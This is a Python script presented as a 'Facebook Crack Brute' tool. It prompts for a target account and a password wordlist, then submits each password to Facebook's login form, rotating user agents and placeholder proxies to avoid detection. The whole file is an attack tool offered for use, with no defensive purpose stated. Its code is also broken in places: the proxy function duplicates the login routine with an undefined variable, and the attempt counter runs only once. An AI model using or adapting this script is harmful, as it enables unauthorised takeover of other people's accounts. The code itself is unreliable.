#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# This Coding is Code in python 2 now it will be renewed soon

import sys
import mechanize
import http.cookiejar as cookielib
import random

# pip install mechanize
# pip install requests

email = str(input("Enter the Facebook Username (or) Email (or) Phone Number: "))
passwordlist = str(input("Enter the wordlist name and path: "))

login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [
    ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')
]

def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    welcome()
    search()
    print("Password does not exist in the wordlist")

def brute(password):
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and ('login_attempt' not in log):
        print("\n\n[+] Password Found = {}".format(password))
        input("ANY KEY to Exit....")
        sys.exit(1)

def change_proxy():
    proxies = [
        'http://proxy1.example.com:8080',
        'http://proxy2.example.com:8080',
        'http://proxy3.example.com:8080'
    ]
    proxy = random.choice(proxies)
    br.set_proxies({"http": proxy, "https": proxy})
    print("[*] Changed proxy to {}".format(proxy))
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and ('login_attempt' not in log):
        print("\n\n[+] Password Found = {}".format(password))
        input("ANY KEY to Exit....")
        sys.exit(1)

global attempt_count
attempt_count = 0
attempt_count += 1
if attempt_count % 3 == 0:
    change_proxy()

def search():
    global password
    passwords = open(passwordlist, "r")
    for password in passwords:
        password = password.replace("\n", "")
        brute(password)

def welcome():
    wel = """
        +=========================================+
        |..........   Facebook Crack Brute   ...........|
        +-----------------------------------------+
        |            #Author: Learn And Earn          | 
        |	       Version 2.0                      |
    |   https://www.youtube.com/@LearnAndEarn101YT      |
        +=========================================+
        |..........  fb-brute  ...........|
        +-----------------------------------------+\n\n
"""
    total = open(passwordlist, "r")
    total = total.readlines()
    print(wel)
    print(" [*] Account to crack: {}".format(email))
    print(" [*] Loaded:", len(total), "passwords")
    print(" [*] Cracking, please wait ...\n\n")

if __name__ == '__main__':
    main()
